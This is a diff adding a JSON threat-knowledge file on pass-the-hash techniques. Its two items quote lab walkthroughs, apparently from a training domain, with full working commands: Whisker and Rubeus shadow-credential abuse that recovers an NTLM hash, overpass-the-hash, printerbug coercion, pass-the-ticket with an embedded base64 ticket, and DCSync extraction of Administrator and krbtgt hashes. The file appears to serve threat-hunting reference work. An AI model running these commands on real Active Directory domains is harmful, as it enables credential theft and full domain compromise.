@@ -1,0 +1,96 @@
+{
+ "class_id": "pass_the_hash",
+ "items": [
+  {
+   "item_key": "pass_the_hash.technique.tested_untitled_now_let_s_see_how_the_au",
+   "kind": "technique",
+   "claim": "Shadow credentials convert a write-capable ACL on a user into that user's NTLM hash: planting a certificate-backed credential on the msDS-KeyCredentialLink attribute and asking the KDC for a TGT with it returns the hash without ever knowing the password.",
+   "body": "Shadow credentials convert a write-capable ACL on a user into that user's NTLM hash: planting a certificate-backed credential on the msDS-KeyCredentialLink attribute and asking the KDC for a TGT with it returns the hash without ever knowing the password.\n\nHackTricks reference: e20cb272 (notion:e20cb272-c1da-42e3-9040-7266489e0ebf)",
+   "disproof": "The attribute cannot be written on the target user, or the certificate-authenticated TGT request returns no NTLM hash for that account.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#e20cb272-c1da-42e3-9040-7266489e0ebf",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "Untitled\n\nNow let\u2019s see how the authentication works\n\n \u2014> pre-auth data encrypted with the timestampyellowhClient1) \n\n \u2014> decrypt it and validate it\u2019s correctyellowhKDC Server2) \n\n \u2014> Send ASREP to the client with the TGTyellowhKDC Server3) \n\nUntitled\n\nyellowhNow the PKINIT\n\nUntitled\n\nyellowhHow it works\n\n1) Client \u2014> pre-auth and encrypt the timestamp with his private key\n\n2) KDC Server \u2014> Validate the client Certificate\n\n3) KDC Server \u2014> Decrypt it to verify\n\n4) KDC Server \u2014> sends ASREP to the client with the TGT\n\nUntitled\n\nyellowhNo PKI No Problem\n\nredhpassword less authenticationIntroduced Key Trust concept to support \n\nUntitled\n\ntealhAbusing Shadow Credentials\n\n1) Enumerating Interesting ACLs\n\nFind-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match \"Studentusers\"}\n\nUntitled\n\nPlease Notice that student Users have generic All on the Support36User\n\n2) let\u2019s add shadow credentials to it\n\n .\\Whisker.exe add /target:Support36User\n\nUntitled\n\nThe shadow credentials have been added to the target user and we got the Rubeus Command that we need to abuse it\n\n3) Checking is the user have the msds-keycredentiallink attribute set \n\nGet-DomainUser -Identity Support36User\n\nUntitled\n\nIt\u2019s indeed set on\n\n4) Now let\u2019s abuse the shadow credentials to get the NTLM hash of the user\n\nRubeus.exe asktgt /user:Support36User /certificate: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 /password:\"YvY36AfCRYo24CAw\" /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /getcredentials /show\n\nUntitled\n\n5) Now let\u2019s try to OverPass-The-Hash\n\n.\\Rubeus.exe asktgt /user:Support36User /domain:us.techcorp.local /rc4:3D441B1832BD67688C191C7C63CCCBB4 /ptt\n\nUntitled\n\nNotice that we got the Support36User ticket\n\n6) List the ticket to validate\n\nklist\n\nUntitled\n\nFinally We got it\n\nAnother way to abuse the shadow credentials is just to Pass-The-Ticket from with the certificate added\n\n.\\Rubeus.exe asktgt /user:Support36User /certificate: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 /password:\"YvY36AfCRYo24CAw\" /domain:us.techcorp.local /dc:US-DC.us.techcorp.local /ptt /show\n\nUntitled\n\nNotice that the ticket imported successfully we just removed the /getcredentials and replace it with /ptt\n\nNow let\u2019s validate the ticket\n\nklist\n\nUntitled\n\nAnd we Sure Got it"
+    },
+    {
+     "url": "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts.md",
+     "source_type": "research",
+     "host": "www.ired.team",
+     "publisher": "ired.team",
+     "quote": "This lab looks at leveraging machine account NTLM password hashes or more specifically - how they can be used in pass the hash attacks to gain additional privileges, depending on which groups the machine is a member of (ideally administrators/domain administrators)."
+    },
+    {
+     "url": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/",
+     "source_type": "research",
+     "host": "learn.microsoft.com",
+     "publisher": "microsoft.com",
+     "quote": "[MS-NLMP]: NT LAN Manager (NTLM) Authentication Protocol Feedback Summarize this article for me In this article Specifies the NT LAN Manager (NTLM) Authentication Protocol, used in Windows for authentication between clients and servers."
+    },
+    {
+     "url": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/",
+     "source_type": "research",
+     "host": "learn.microsoft.com",
+     "publisher": "microsoft.com",
+     "quote": "[MS-NLMP]: NT LAN Manager (NTLM) Authentication Protocol Feedback Summarize this article for me In this article Specifies the NT LAN Manager (NTLM) Authentication Protocol, used in Windows for authentication between clients and servers."
+    }
+   ]
+  },
+  {
+   "item_key": "pass_the_hash.technique.tested_page_c5573d3d_ce58_4bd5_b75a_109db",
+   "kind": "technique",
+   "claim": "Coercing a domain controller that has unconstrained delegation enabled with a printerbug forces it to hand out a TGT to the attacker, which is then replayed as a pass-the-ticket and confirmed by the local ticket list.",
+   "body": "Coercing a domain controller that has unconstrained delegation enabled with a printerbug forces it to hand out a TGT to the attacker, which is then replayed as a pass-the-ticket and confirmed by the local ticket list.\n\nHackTricks reference: c5573d3d (notion:c5573d3d-ce58-4bd5-b75a-109dbe085fe0)",
+   "disproof": "No TGT appears in the monitor after the coercion, or the local ticket list still shows no imported ticket after the pass-the-ticket step.",
+   "hunting_value": 4,
+   "sources": [
+    {
+     "url": "https://tested-corleggy-562.notion.site/?pvs=4#c5573d3d-ce58-4bd5-b75a-109dbe085fe0",
+     "source_type": "reference",
+     "host": "tested-corleggy-562.notion.site",
+     "publisher": "source-guide",
+     "quote": "page c5573d3d-ce58-4bd5-b75a-109dbe085fe0\n\nWe will learn how to abuse unconstrained delegation across forest\n\nFirst checking if TGTDelegation is enabled\n\nOpen Rubeus.exe in monitoring mode\n\n.\\Rubeus.exe monitor /target:usvendor-dc$ /interval:5 /nowrap\n\nUntitled\n\nNow let\u2019s Abuse the printerbug\n\nMS-RPRN.exe \\\\usvendor-dc.usvendor.local \\\\us-web.us.techcorp.local\n\nUntitled\n\nNow let\u2019s go and check Rubeus.exe\n\nUntitled\n\nwe got the usvendor-dc ticket\n\nLet\u2019s use Rubeus.exe to perform Pass-The-Ticket\n\n.\\Rubeus.exe ptt /ticket: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\n\nUntitled\n\nNow let\u2019s list the tickets to validate\n\nklist\n\nUntitled\n\nAs observed we got it\n\nLet\u2019s perform DCSync and extract the admin hash\n\n.\\BetterSafetyKatz.exe \"lsadump::dcsync /user:usvendor\\Administrator /domain:usvendor.local\" \"exit\"\n\nUntitled\n\nAnd we got the administrator hash\n\nLet\u2019s perform DCSync and extract the krbtgt hash\n\n.\\BetterSafetyKatz.exe \"lsadump::dcsync /user:usvendor\\krbtgt /domain:usvendor.local\" \"exit\"\n\nUntitled\n\nAnd we got the Krbtgt hash"
+    },
+    {
+     "url": "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts.md",
+     "source_type": "research",
+     "host": "www.ired.team",
+     "publisher": "ired.team",
+     "quote": "This lab looks at leveraging machine account NTLM password hashes or more specifically - how they can be used in pass the hash attacks to gain additional privileges, depending on which groups the machine is a member of (ideally administrators/domain administrators)."
+    },
+    {
+     "url": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/",
+     "source_type": "research",
+     "host": "learn.microsoft.com",
+     "publisher": "microsoft.com",
+     "quote": "[MS-NLMP]: NT LAN Manager (NTLM) Authentication Protocol Feedback Summarize this article for me In this article Specifies the NT LAN Manager (NTLM) Authentication Protocol, used in Windows for authentication between clients and servers."
+    },
+    {
+     "url": "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/",
+     "source_type": "research",
+     "host": "learn.microsoft.com",
+     "publisher": "microsoft.com",
+     "quote": "[MS-NLMP]: NT LAN Manager (NTLM) Authentication Protocol Feedback Summarize this article for me In this article Specifies the NT LAN Manager (NTLM) Authentication Protocol, used in Windows for authentication between clients and servers."
+    }
+   ]
+  }
+ ],
+ "publishers": [
+  "ired.team",
+  "microsoft.com",
+  "source-guide"
+ ],
+ "sources": [
+  "https://tested-corleggy-562.notion.site/?pvs=4#e20cb272-c1da-42e3-9040-7266489e0ebf",
+  "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts.md",
+  "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/",
+  "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/",
+  "https://tested-corleggy-562.notion.site/?pvs=4#c5573d3d-ce58-4bd5-b75a-109dbe085fe0",
+  "https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/pass-the-hash-with-machine-accounts.md",
+  "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/",
+  "https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/"
+ ]
+}
